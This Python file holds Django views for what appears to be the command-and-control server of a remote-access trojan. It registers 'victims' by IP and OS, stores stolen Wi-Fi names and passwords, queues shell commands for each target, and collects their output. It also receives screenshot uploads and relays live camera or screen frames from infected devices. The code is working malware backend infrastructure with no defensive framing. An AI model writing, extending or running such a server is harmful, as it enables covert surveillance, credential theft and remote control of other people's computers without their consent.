from django.http import StreamingHttpResponse, HttpResponse
from django.core.files.storage import default_storage
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from rest_framework.views import APIView
from rest_framework import response
from django.conf import settings
from django.views import View
from .serializers import *
from .models import *
import queue
import os

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]  # Use the first IP in the list
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip



# Dictionary to store buffers for each device
device_buffers = {}

class UploadStreamView(View):
    """Handles receiving frames from clients."""

    @method_decorator(csrf_exempt)
    def dispatch(self, *args, **kwargs):
        return super().dispatch(*args, **kwargs)

    def post(self, request, *args, **kwargs):
        device_name = request.GET.get('device_name')  # Device name from query parameter
        if not device_name:
            return HttpResponse("Missing device_name", status=400)

        if device_name not in device_buffers:
            device_buffers[device_name] = queue.Queue(maxsize=5)

        try:
            if device_buffers[device_name].qsize() >= 5:  
                device_buffers[device_name].get_nowait()
            device_buffers[device_name].put(request.body, block=False)
            return HttpResponse("Frame received", status=200)
        except queue.Full:
            return HttpResponse(f"Buffer full for device: {device_name}", status=429)


class StreamView(View):
    """Serves the video stream for a specific device."""

    def get(self, request, device_name, *args, **kwargs):
        if device_name not in device_buffers:
            return HttpResponse("Device not found", status=404)

        def generate():
            buffer = device_buffers[device_name]
            while True:
                frame = buffer.get()
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

        return StreamingHttpResponse(generate(), content_type='multipart/x-mixed-replace; boundary=frame')


class VictimeView(APIView):
    def get(self, request):
        victims = Target.objects.all().order_by('-created')
        return response.Response(VictimsSerializer(victims, many=True).data)

    def post(self, request):
        data = request.data
        name = data.get('name')
        os_name = data.get('os')
        ip = get_client_ip(request)
        
        if Target.objects.filter(name=name, ip=ip).exists():
            return response.Response({'message' : 'Victim already registered !!!'})
            
        Target.objects.create(
            name=name,
            ip=ip,
            os_name=os_name,
        )
        
        return response.Response({'message': 'Victim added successfully !!!'})
    

class Network(APIView):
    def post(self, request):
        data = request.data
        user = data.get('name')
        network = data.get('ussid')
        password = data.get('password')
        
        if Network.objects.filter(name=user, ussid=network).exists():
            return response.Response({'message' : 'Network already registered !!!'})
            
        Network.objects.create(
            name=user,
            ussid=network,
            password=password,
        )
        
        return response.Response({'message': 'Network powned successfully !!!'})
        
class Control(APIView):
    def get(self, request):
        target = request.GET.get('target')
        print(target)
        commands = Command.objects.filter(target=target)
        if not commands or not target:
            commands = Command.objects.all()
            return response.Response(CommandsSerializer(commands, many=True).data)
        return response.Response(CommandsSerializer(commands, many=True).data)
    
    def post(self, request):
        data = request.data
        target = data.get('target')
        command = data.get('command')
        
        if Command.objects.filter(target=target, command=command).exists():
            return response.Response({'message' : 'Command already registered !!!'})
            
        Command.objects.create(
            target=target,
            command=command,
        )
        
        return response.Response({'message': 'Command registered successfully !!!'})

    def delete(self, request):
        command = request.GET.get('command')
        target = request.GET.get('target')
        if target and command:
            Command.objects.filter(command=command,target=target).delete()
            return response.Response({'message': 'Command deleted successfully !!!'})
        
        if target:
            Command.objects.filter(target=target).delete()
            return response.Response({'message': 'All commands for target deleted successfully !!!'})
         
        return response.Response({'message': 'Target or command is missing  !!!'})
    
class StatesView(APIView):
    def get(self, request):
        target = request.GET.get('target')
        if not target:
            states = State.objects.all().order_by("-created")
            return response.Response(StateSerializer(states, many=True).data)
        return response.Response(StateSerializer(State.objects.filter(target=target).order_by("-created"), many=True).data)
    
    def post(self, request):
        data = request.data
        target = data.get('target')
        state_value = data.get('state')
        if State.objects.filter(target=target).exists():
            State.objects.filter(target=target).delete()
        State.objects.create(
            target=target,
            state=state_value,
        )
        
        return response.Response({'message': 'State updated successfully !!!'})

class LogView(APIView):
    def get(self, request):
        target = request.GET.get('target')
        cmd = request.GET.get('cmd')
        logs = Log.objects.filter(target=target,command=cmd)
        if not logs or not target:
            logs = Log.objects.all().order_by('-created')
            return response.Response(LogSerializer(logs, many=True).data)
        return response.Response(LogSerializer(logs, many=True).data)
    
    def post(self, request):
        data = request.data
        target = data.get('target')
        log = data.get('log')
        cmd = data.get('command')
        
        Log.objects.create(
            target=target,
            log=log,
            command=cmd,
        )
        
        return response.Response({'message': 'Command executed successfully !!!'})

    def delete(self, request):
        Log.objects.all().delete()
        return response.Response({'message': 'Log deleted successfully !!!'})
    
class UploadView(APIView):

    def post(self, request):
        data = request.data
        target = data.get('target')

        if 'file' not in request.FILES:
            return response.Response({'error': 'No file provided!'}, status=400)

        file = request.FILES['file']
        file_path = os.path.join('uploads', file.name)

        try:
            saved_path = default_storage.save(file_path, file)
            file_url = os.path.join(settings.MEDIA_URL, saved_path)
            Log.objects.create(
                target=target,
                log=f'image uploaded sucessfuly and save on {file_path}',
                img=saved_path,
                command="screen shot",
            )

            return response.Response({
                'message': 'File uploaded successfully!',
                'file_path': file_url,
            })
        except Exception as e:
            return response.Response({'error': str(e)}, status=500)
        
class MusicView(APIView):
    def get(self, request):
        target = request.GET.get('target')
        if not target:
            music = Track.objects.all().order_by('-created')
            return response.Response(MusicSerializer(music, many=True).data)
        return response.Response(MusicSerializer(Track.objects.filter(target=target).order_by('-created'), many=True).data)
    
    def post(self, request):
        data = request.data
        target = data.get('target')
        music = request.FILES.get('music')
        
        if Track.objects.filter(target=target).exists():
            Track.objects.filter(target=target).delete()

        Track.objects.create(
            target=target,
            track=music,
        )
    
        return response.Response({'message': 'Music added successfully !!!'})